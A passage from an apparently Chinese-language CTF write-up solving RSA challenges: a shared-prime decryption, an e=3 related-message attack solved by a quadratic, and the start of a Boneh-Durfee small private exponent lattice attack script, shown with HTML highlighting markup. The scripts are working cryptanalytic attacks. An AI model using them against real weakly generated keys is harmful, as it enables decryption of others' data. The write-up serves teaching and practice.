n2=0xc31344c753e25135d5eed8febaa57dd7020b503a5569bdd4ae6747b5c36436dc1c4d7ead77bfc1034748bcc630636bae1c8f4ca5dee8246b3d6f3e8b14e16487733b14ec8e587e07a7a6de45859d32d241eaf7746c45ff404f1a767ab77e8493ae8141fee0bcf4e9b7c455415b6945fa60de928b01dfa90bbf0d09194f93db7a1663121d281c908f0e38237f63c2b856f99c6029d993f9afb5fbbb762044d97943ff34023486c4cf1db9ffdc439d9f5ff331b606374c7133d61e4614fac3ea7faaf54563338b736282658e7925b224577091831351a28679a8d6f8e7ba16685b2769bb49b79f8054b29c809d68aca0f2c5e3f1fd0e3ef6c21f756e3c44a40439</span><span class="token comment" spellcheck="true"># # e2=0x10001</span><span class="token comment" spellcheck="true"># # c2=0xbefa7d62f15cafc81d098fdd524411537e948d83266ef22848f44d2e43d1f1388a26bb21c8fb08b571c7cbd6630d6f2b409c85c68a6419e472941e4978f60b93e1ce850344dbe99f1918cb5b8c35075bbdca82fa233d1300f108e4b75ce10d7b0ffa145bceffbc7a5204bf9c119f77af191091f25140aedcdd333b631b240ddad3108c96084dffe6e49e04880908fa02c02edb58e2f27919d707151adb6787384ca28050f8d77418cc1733187d7695f57127be8d6174562723679ba39790d7f2306271b9d8f4d2bdde9ed798af00074ec7da3a7f1ffeb4fc6a61804e51c0f92d384dc62b80fd44492588af26ac0185a23f86c46a7ffdec9fcf31b02b08b63001</span><span class="token comment" spellcheck="true"># print "p -> {}".format(gcd(n1, n2))</span><span class="token comment" spellcheck="true"># print "q1 -> {}".format(n1 / gcd(n1, n2))</span><span class="token comment" spellcheck="true"># print "q2 -> {}".format(n2 / gcd(n1, n2))</span>q <span class="token operator">=</span> <span class="token number">161993393900030566867150602363721535479433489542726899362944130872107225598993516228193877689420023695231584876954537089973673478074348422697619820309397363583748523503035462772765277978491082324620122838540365168604124924805412323471486221429513024367107238770298040268787441768635257727315317704741778501737</span>p1 <span class="token operator">=</span> <span class="token number">92392842076088454558676873885205432277688794102622657192126179753576488966439636785821047115301443362169549898465575056742381428321997570097374526363913597739756884031644135343404225885226264566916462715686341654211514913366341960827374747754358972050549971216117165750261475461979495685882564817634194301271</span>p2 <span class="token operator">=</span> <span class="token number">90279376687119715076904357810855212347782022402759254635072438787841245581930716927541800564582197695494423401147385731042364986596482750220701857807271816829238846312998439918616452075752787878425283820635199121653984306111110530896331011530772771558835563313746863033189248831495407320154948117671577602867</span><span class="token comment" spellcheck="true">#p=getPrime(1024)</span><span class="token comment" spellcheck="true">#q=getPrime(1024)</span>e<span class="token operator">=</span><span class="token number">65537</span>n<span class="token operator">=</span>p1<span class="token operator">*</span>qc <span class="token operator">=</span> <span class="token number">2482083893746618248544426737023750400124543452082436334398504986023501710639402060949106693279462896968839029712099336235976221571564642900240827774719199533124053953157919850838214021934907480633441577316263853011232518392904983028052155862154264401108124968404098823946691811798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432684946922741232053249894575417796067090655122702306134848220257943297645461477488086804856018323986796999103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597</span>fn <span class="token operator">=</span> <span class="token punctuation">(</span>p1<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token number">3966878437245643631637564975732704690837306124446086877872976205025646385675581853511438558449272831057566720069483322716185302889500282616707242022434828280064159692586323031389171478503753908040157812124377949328353938367107704570961998942943251122002994862593199357765354157601632561816952286250637771656438228389552713018311110406430345367091645709437632368795499521650765928713846948596775009799649123556193038678824282362527557831582015129491351042998117090300454963836491928898672785463727735926420386710315758459309854603319606229977802586942578329763497502143858265135463947731426008988290087504887177240673</span>m <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></code></pre><h2 id="‚ùéChallenge-5"><a href="#‚ùéChallenge-5" class="headerlink" title="‚ùéChallenge 5"></a>‚ùéChallenge 5</h2><p>Â∑≤Áü•nÂíå‰∏§‰∏™cipherÔºåÂπ∂‰∏îÊòØÁî±mÂíåm+1Âä†ÂØÜËÄåÊù•„ÄÇ</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">5</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x198f61bc7d2977139120b86b739afbd04e82726a7dcf514cc2ad46c7002d2202915ba932364d71b7dd1928fb6861f984d8d9e31e70d0023aca721130e1df2825568a623c8316fd555616d91897a2db5d1df973a1584ed4cfb0f55d910db5ff64a79f061ef71b2362b6c2af8416a5a47094aff428d6c541448df45436ec48f93L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x13a5213f8946b3da1b37a7346f7985ed17329b05c31cc72912e15ab62c2b578f95148f7f2fb3daed063f5517efd9694d8a87792b675715d50d9113baa0bbfb1791f8e551ce5583c3dc31adf37dced9dab4acf3e58a5f3e203b1c971a746de5e9ac0b4d0153538f9392a0ce12250c5597eb23f07b4d7c84a084fc1dd0dee6b1cL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>x<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0xa864c9ffa08edc2d2a380fde218fe07204193c43580ee0a3fd1505e3f60125c3f380fab24bbd344bca174f3b5b09ed271b817cb08fa6087f2b9d2216a1c7782714c50f475b0e3ca8b530ae33f4f4fb72c14ac0331b107d9dfcbbb193ac6946edd01e9cf5cab799a444dd9a49eb5362f6a499fa69540ac1d3dfbb977f57cd8eL</code></pre><p>ÈÄöËøáÂåñÁÆÄÂæóÂà∞ <code>ËÆ°ÁÆóÂÖ¨ÂºèÔºö (m+1)^3 - m^3 = c2-c1 ==&gt; (3m^2+3m+1)Âä†Âáèk*n=c2-c1</code></p><p>‰∏ÄÂÖÉ‰∫åÊ¨°ÊñπÁ®ãÊ±ÇÊ†πÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190529105312.png" alt=""></p><p>Ê≠§Êó∂Âè™ÈúÄÊ±ÇÁ¨¶ÂêàÊù°‰ª∂ÁöÑkÂÄºÂç≥ÂèØ„ÄÇ</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token comment" spellcheck="true"># Ê±Ç‰∏ÄÂÖÉ‰∫åÊ¨°ÊñπÁ®ãÊ†π</span>n<span class="token operator">=</span>0x198f61bc7d2977139120b86b739afbd04e82726a7dcf514cc2ad46c7002d2202915ba932364d71b7dd1928fb6861f984d8d9e31e70d0023aca721130e1df2825568a623c8316fd555616d91897a2db5d1df973a1584ed4cfb0f55d910db5ff64a79f061ef71b2362b6c2af8416a5a47094aff428d6c541448df45436ec48f93Lc1<span class="token operator">=</span>0x13a5213f8946b3da1b37a7346f7985ed17329b05c31cc72912e15ab62c2b578f95148f7f2fb3daed063f5517efd9694d8a87792b675715d50d9113baa0bbfb1791f8e551ce5583c3dc31adf37dced9dab4acf3e58a5f3e203b1c971a746de5e9ac0b4d0153538f9392a0ce12250c5597eb23f07b4d7c84a084fc1dd0dee6b1cLc2<span class="token operator">=</span>0xa864c9ffa08edc2d2a380fde218fe07204193c43580ee0a3fd1505e3f60125c3f380fab24bbd344bca174f3b5b09ed271b817cb08fa6087f2b9d2216a1c7782714c50f475b0e3ca8b530ae33f4f4fb72c14ac0331b107d9dfcbbb193ac6946edd01e9cf5cab799a444dd9a49eb5362f6a499fa69540ac1d3dfbb977f57cd8eLe<span class="token operator">=</span><span class="token number">3</span>m <span class="token operator">=</span> <span class="token string">''</span><span class="token comment" spellcheck="true"># 3m^2+3m+1=c2-c1</span><span class="token comment" spellcheck="true"># ‚ñ≤ = 9-4*3*(1-c2+c1)</span><span class="token comment" spellcheck="true"># x = (-b[+-](‚ñ≤)^0.5)/(2*a)==>ÂèØ‰ª•Áü•ÈÅìx‰∏∫mÔºåÂç≥‰∏∫Êï¥Êï∞</span><span class="token comment" spellcheck="true"># c = 1-c2+c1-(k*n)</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    c<span class="token operator">=</span><span class="token number">1</span><span class="token operator">-</span>n<span class="token operator">*</span>k<span class="token operator">+</span><span class="token punctuation">(</span>c1<span class="token operator">-</span>c2<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print(c)</span>    delta <span class="token operator">=</span> <span class="token number">9</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">*</span>c    <span class="token comment" spellcheck="true">#print(delta)</span>    <span class="token keyword">if</span> delta<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#print(iroot(delta,2)[1])</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>iroot<span class="token punctuation">(</span>delta<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>iroot<span class="token punctuation">(</span><span class="token number">9</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">*</span>c<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    m<span class="token operator">=</span><span class="token punctuation">(</span>iroot<span class="token punctuation">(</span><span class="token number">9</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">*</span>c<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">6</span> <span class="token comment" spellcheck="true">#Ê±ÇÊ†π</span>                    <span class="token keyword">if</span> pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">==</span>c1<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#i = 17Êó∂Á¨¶ÂêàÊù°‰ª∂</span>                        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    k <span class="token operator">+=</span> <span class="token number">1</span></code></pre><h2 id="‚ùéChallenge-6"><a href="#‚ùéChallenge-6" class="headerlink" title="‚ùéChallenge 6"></a>‚ùéChallenge 6</h2><p>Boneh and Durfee attack.ÔºàÂΩìdÁöÑbitsÊï∞Â∞è‰∫énÁöÑ‰∏ÄÂÆöÁ®ãÂ∫¶Êó∂ÔºåÂèØÈááÁî®Ê≠§ÊîªÂáª„ÄÇÈ¢ò‰∏≠Âá∫Áé∞‰∫Ü<code>d=random.getrandbits(1024*0.270)</code>Ôºâ</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">6</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">0.270</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span>invmod<span class="token punctuation">(</span>d<span class="token punctuation">,</span>phin<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>hex<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token operator">=</span>0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> time<span class="token comment" spellcheck="true">############################################</span><span class="token comment" spellcheck="true"># Config</span><span class="token comment" spellcheck="true">##########################################</span><span class="token triple-quoted-string string">"""Setting debug to true will display more informationsabout the lattice, the bounds, the vectors..."""</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token triple-quoted-string string">"""Setting strict to true will stop the algorithm (andreturn (-1, -1)) if we don't have a correct upperbound on the determinant. Note that this doesn't necesseraly mean that no solutions will be found since the theoretical upperbound isusualy far away from actual results. That is whyyou should probably use `strict = False`"""</span>strict <span class="token operator">=</span> <span class="token boolean">False</span><span class="token triple-quoted-string string">"""This is experimental, but has provided remarkable resultsso far. It tries to reduce the lattice as much as it canwhile keeping its efficiency. I see no reason not to usethis option, but if things don't work, you should trydisabling it"""</span>helpful_only <span class="token operator">=</span> <span class="token boolean">True</span>dimension_min <span class="token operator">=</span> <span class="token number">7</span> <span class="token comment" spellcheck="true"># stop removing if lattice reaches that dimension</span><span class="token comment" spellcheck="true">############################################</span><span class="token comment" spellcheck="true"># Functions</span><span class="token comment" spellcheck="true">##########################################</span><span class="token comment" spellcheck="true"># display stats on helpful vectors</span><span class="token keyword">def</span> <span class="token function">helpful_vectors</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token punctuation">)</span><span class="token punctuation">:</span>    nothelpful <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span>ii<span class="token punctuation">]</span> <span class="token operator">>=</span> modulus<span class="token punctuation">:</span>            nothelpful <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">print</span> nothelpful<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">" vectors are not helpful"</span><span class="token comment" spellcheck="true"># display matrix picture with 0 and X</span><span class="token keyword">def</span> <span class="token function">matrix_overview</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> bound<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%02d '</span> <span class="token operator">%</span> ii<span class="token punctuation">)</span>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            a <span class="token operator">+=</span> <span class="token string">'0'</span> <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span>jj<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token string">'X'</span>            <span class="token keyword">if</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">60</span><span class="token punctuation">:</span>                a <span class="token operator">+=</span> <span class="token string">' '</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">>=</span> bound<span class="token punctuation">:</span>            a <span class="token operator">+=</span> <span class="token string">'~'</span>        <span class="token keyword">print</span> a<span class="token comment" spellcheck="true"># tries to remove unhelpful vectors</span><span class="token comment" spellcheck="true"># we start at current = n-1 (last vector)</span><span class="token keyword">def</span> <span class="token function">remove_unhelpful</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> current<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># end of our recursive function</span>    <span class="token keyword">if</span> current <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">or</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> dimension_min<span class="token punctuation">:</span>        <span class="token keyword">return</span> BB    <span class="token comment" spellcheck="true"># we start by checking from the end</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>current<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># if it is unhelpful:</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">>=</span> bound<span class="token punctuation">:</span>            affected_vectors <span class="token operator">=</span> <span class="token number">0</span>            affected_vector_index <span class="token operator">=</span> <span class="token number">0</span>            <span class="token comment" spellcheck="true"># let's check if it affects other vectors</span>            <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span>ii <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment" spellcheck="true"># if another vector is affected:</span>                <span class="token comment" spellcheck="true"># we increase the count</span>                <span class="token keyword">if</span> BB<span class="token punctuation">[</span>jj<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                    affected_vectors <span class="token operator">+=</span> <span class="token number">1</span>                    affected_vector_index <span class="token operator">=</span> jj            <span class="token comment" spellcheck="true"># level:0</span>            <span class="token comment" spellcheck="true"># if no other vectors end up affected</span>            <span class="token comment" spellcheck="true"># we remove it</span>            <span class="token keyword">if</span> affected_vectors <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">"* removing unhelpful vector"</span><span class="token punctuation">,</span> ii                BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_columns<span class="token punctuation">(</span><span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_rows<span class="token punctuation">(</span><span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>ii<span class="token punctuation">)</span>                BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> ii<span class="token number">-1</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> BB            <span class="token comment" spellcheck="true"># level:1</span>            <span class="token comment" spellcheck="true"># if just one was affected we check</span>            <span class="token comment" spellcheck="true"># if it is affecting someone else</span>            <span class="token keyword">elif</span> affected_vectors <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                affected_deeper <span class="token operator">=</span> <span class="token boolean">True</span>                <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>affected_vector_index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token comment" spellcheck="true"># if it is affecting even one vector</span>                    <span class="token comment" spellcheck="true"># we give up on this one</span>                    <span class="token keyword">if</span> BB<span class="token punctuation">[</span>kk<span class="token punctuation">,</span> affected_vector_index<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                        affected_deeper <span class="token operator">=</span> <span class="token boolean">False</span>                <span class="token comment" spellcheck="true"># remove both it if no other vector was affected and</span>                <span class="token comment" spellcheck="true"># this helpful vector is not helpful enough</span>                <span class="token comment" spellcheck="true"># compared to our unhelpful one</span>                <span class="token keyword">if</span> affected_deeper <span class="token operator">and</span> abs<span class="token punctuation">(</span>bound <span class="token operator">-</span> BB<span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> affected_vector_index<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> abs<span class="token punctuation">(</span>bound <span class="token operator">-</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span> <span class="token string">"* removing unhelpful vectors"</span><span class="token punctuation">,</span> ii<span class="token punctuation">,</span> <span class="token string">"and"</span><span class="token punctuation">,</span> affected_vector_index                    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_columns<span class="token punctuation">(</span><span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_rows<span class="token punctuation">(</span><span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                    monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>affected_vector_index<span class="token punctuation">)</span>                    monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>ii<span class="token punctuation">)</span>                    BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> ii<span class="token number">-1</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span> BB    <span class="token comment" spellcheck="true"># nothing happened</span>    <span class="token keyword">return</span> BB<span class="token triple-quoted-string string">""" Returns:* 0,0   if it fails* -1,-1 if `strict=true`, and determinant doesn't bound* x0,y0 the solutions of `pol`"""</span><span class="token keyword">def</span> <span class="token function">boneh_durfee</span><span class="token punctuation">(</span>pol<span class="token punctuation">,</span> modulus<span class="token punctuation">,</span> mm<span class="token punctuation">,</span> tt<span class="token punctuation">,</span> XX<span class="token punctuation">,</span> YY<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Boneh and Durfee revisited by Herrmann and May    finds a solution if:    * d &lt; N^delta    * |x| &lt; e^delta    * |y| &lt; e^0.5    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292    """</span>    <span class="token comment" spellcheck="true"># substitution (Herrman and May)</span>    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>    Q <span class="token operator">=</span> PR<span class="token punctuation">.</span>quotient<span class="token punctuation">(</span>x<span class="token operator">*</span>y <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">-</span> u<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># u = xy + 1</span>    polZ <span class="token operator">=</span> Q<span class="token punctuation">(</span>pol<span class="token punctuation">)</span><span class="token punctuation">.</span>lift<span class="token punctuation">(</span><span class="token punctuation">)</span>    UU <span class="token operator">=</span> XX<span class="token operator">*</span>YY <span class="token operator">+</span> <span class="token number">1</span>    <span class="token comment" spellcheck="true"># x-shifts</span>    gg <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>mm <span class="token operator">-</span> kk <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            xshift <span class="token operator">=</span> x<span class="token operator">^</span>ii <span class="token operator">*</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm <span class="token operator">-</span> kk<span class="token punctuation">)</span> <span class="token operator">*</span> polZ<span class="token punctuation">(</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token operator">^</span>kk            gg<span class="token punctuation">.</span>append<span class="token punctuation">(</span>xshift<span class="token punctuation">)</span>    gg<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># x-shifts list of monomials</span>    monomials <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> polynomial <span class="token keyword">in</span> gg<span class="token punctuation">:</span>        <span class="token keyword">for</span> monomial <span class="token keyword">in</span> polynomial<span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> monomial <span class="token operator">not</span> <span class="token keyword">in</span> monomials<span class="token punctuation">:</span>                monomials<span class="token punctuation">.</span>append<span class="token punctuation">(</span>monomial<span class="token punctuation">)</span>    monomials<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># y-shifts (selected by Herrman and May)</span>    <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> tt <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>mm<span class="token operator">/</span>tt<span class="token punctuation">)</span> <span class="token operator">*</span> jj<span class="token punctuation">,</span> mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            yshift <span class="token operator">=</span> y<span class="token operator">^</span>jj <span class="token operator">*</span> polZ<span class="token punctuation">(</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token 